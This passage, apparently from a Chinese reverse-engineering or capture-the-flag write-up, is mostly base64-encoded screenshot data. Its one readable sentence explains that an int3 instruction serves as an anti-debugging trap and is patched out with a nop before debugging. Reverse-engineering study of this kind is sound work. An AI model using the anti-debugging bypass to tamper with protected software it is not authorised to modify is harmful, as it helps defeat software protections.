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'/></p>
<p>这个int3会反调试，一旦运行该行命令会卡死程序，将其nop掉后调试</p>
<p><img src='data:img/jpg;base64,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
